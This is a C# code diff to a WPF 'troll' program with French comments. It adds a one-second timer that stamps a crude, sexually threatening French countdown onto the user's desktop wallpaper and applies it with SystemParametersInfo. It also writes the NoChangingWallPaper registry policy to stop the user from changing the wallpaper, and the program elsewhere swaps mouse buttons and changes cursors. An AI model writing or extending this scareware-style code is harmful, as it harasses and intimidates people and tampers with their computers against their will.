@@ -53,7 +53,9 @@ namespace TrollUI
         private DispatcherTimer? _renderTimer;
         private DispatcherTimer? _phaseTimer;
         private DispatcherTimer? _timeoutTimer;
+        private DispatcherTimer? _wallpaperTimer; // Nouveau timer pour le compte à rebours
         private int _currentPhase = 0;
+        private int _wallpaperCountdown = 30; // 30 secondes
         private Random _rng = new Random();
         
         // Effects layers
@@ -302,6 +304,77 @@ namespace TrollUI
             {
                 PlayAudioAsync("cry.wav", true);
             }
+            
+            // Activation du Wallpaper Timer en modes agressifs
+            if (mode == "RIRI" || mode == "PUNISHER" || mode == "SOFT")
+            {
+                _wallpaperCountdown = (mode == "PUNISHER") ? 15 : 60; // 15 ou 60 sec selon l'urgence
+                _wallpaperTimer = new DispatcherTimer();
+                _wallpaperTimer.Interval = TimeSpan.FromSeconds(1);
+                _wallpaperTimer.Tick += WallpaperTimer_Tick;
+                _wallpaperTimer.Start();
+                UpdateWallpaper(); // Init immédiate
+            }
+        }
+        
+        private void WallpaperTimer_Tick(object? sender, EventArgs e)
+        {
+            _wallpaperCountdown--;
+            UpdateWallpaper();
+        }
+        
+        private void UpdateWallpaper()
+        {
+            string baseImgPath = Path.Combine(_assetDir, "Sans titre.png");
+            if (!File.Exists(baseImgPath)) return;
+            
+            // On veut générer une image modifiée avec le texte
+            string outPath = Path.Combine(Path.GetTempPath(), "troll_wallpaper.bmp");
+            
+            using (var bmp = SKBitmap.Decode(baseImgPath))
+            {
+                if (bmp == null) return;
+                
+                var info = new SKImageInfo(bmp.Width, bmp.Height, bmp.ColorType, bmp.AlphaType);
+                using (var surface = SKSurface.Create(info))
+                {
+                    var canvas = surface.Canvas;
+                    canvas.DrawBitmap(bmp, 0, 0);
+                    
+                    // Incruster le texte rouge sang
+                    using (var pBg = new SKPaint { Color = new SKColor(0, 0, 0, 180), Style = SKPaintStyle.Fill })
+                    using (var pText = new SKPaint { Color = SKColors.Red, IsAntialias = true })
+                    using (var font = new SKFont(SKTypeface.FromFamilyName("Impact"), bmp.Width / 15f))
+                    {
+                        string txt = $"RIRIMIAOU TE BAISERA LE CUL DANS : {_wallpaperCountdown} SECONDES";
+                        if (_wallpaperCountdown <= 0) txt = "TROP LENT. T'ES FINI.";
+                        
+                        float th = font.Size + 20;
+                        canvas.DrawRect(0, bmp.Height - th - 50, bmp.Width, th, pBg);
+                        canvas.DrawText(txt, bmp.Width / 2f, bmp.Height - 60, SKTextAlign.Center, font, pText);
+                    }
+                    
+                    using (var image = surface.Snapshot())
+                    using (var data = image.Encode(SKEncodedImageFormat.Bmp, 100))
+                    using (var stream = File.OpenWrite(outPath))
+                    {
+                        data.SaveTo(stream);
+                    }
+                }
+            }
+            
+            // Appliquer le wallpaper via SystemParametersInfo
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, outPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
+            
+            // Lockdown : interdiction de le changer via Stratégie de Groupe (Registre)
+            try
+            {
+                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"))
+                {
+                    key.SetValue("NoChangingWallPaper", 1, Microsoft.Win32.RegistryValueKind.DWord);
+                }
+            }
+            catch { /* Silencieux si pas de perms admin */ }
         }
 
         private bool CheckKillSwitch()
@@ -312,10 +385,21 @@ namespace TrollUI
                 {
                     _renderTimer?.Stop();
                     _phaseTimer?.Stop();
+                    _wallpaperTimer?.Stop();
                     
                     // Cleanup Lore FR (rétablir les clics normaux de la souris)
                     SwapMouseButton(0);
                     SystemParametersInfo(SPI_SETCURSORS, 0, null!, 0);
+                    
+                    // Déverrouillage du fond d'écran
+                    try
+                    {
+                        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", true))
+                        {
+                            if (key != null) key.DeleteValue("NoChangingWallPaper", false);
+                        }
+                    }
+                    catch { }
                     
                     Application.Current.Shutdown();
                     return true;
